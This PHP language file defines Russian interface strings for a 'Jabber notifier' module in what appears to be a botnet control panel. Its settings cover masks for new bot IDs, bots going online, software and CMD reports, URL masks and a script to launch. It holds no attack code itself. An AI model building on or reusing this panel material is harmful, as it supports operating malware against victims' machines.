<?php if(!defined('__CP__'))die();
define('LNG_REPORTS', 'Jabber notifier');

define('LNG_REPORTS_OPTIONS',          'Настройки');
define('LNG_REPORTS_OPTIONS_ENABLE',   'Включить');
define('LNG_REPORTS_OPTIONS_ACCOUNT',  'Аккаунт (name@server[:port]):');
define('LNG_REPORTS_OPTIONS_PASSWORD', 'Пароль:');
define('LNG_REPORTS_OPTIONS_TO',       'Получатели через запятую (name@server,..):');
define('LNG_REPORTS_OPTIONS_BOTMASKS',              'Маски новых botId (по подному в строку):');
define('LNG_REPORTS_OPTIONS_MASKS_WENTONLINE',      'Маски на BotId вышел онлайн (по подному на строку):');
define('LNG_REPORTS_OPTIONS_MASKS_SOFTWARE',        'Маски на содержимое software report (по одной в строку):');
define('LNG_REPORTS_OPTIONS_MASKS_CMD',             'Маски на содержимое CMD отчётов (по одной в строку):');
define('LNG_REPORTS_OPTIONS_IGNORE_BOTIDS',         'Игнорируемые BotID (по одному в строку):');
define('LNG_REPORTS_OPTIONS_MASKS',    'Маски URL (по одной в строку):');
define('LNG_REPORTS_OPTIONS_SCRIPT',   'URL-файл для запуска:');
define('LNG_REPORTS_OPTIONS_LOGFILE',  'Локальный лог-файл:');

define('LNG_REPORTS_E1', 'Не верно указаны данные аккаунта.');
define('LNG_REPORTS_E2', 'Не верно указан получатель (user@host через запятую).');
define('LNG_REPORTS_E3', 'Не удалось обновить файл конфигурации, возможно не достаточно прав.');

define('LNG_REPORTS_SAVE',    'Сохранить');
define('LNG_REPORTS_UPDATED', 'Настройки успешно обновлены.');
?>
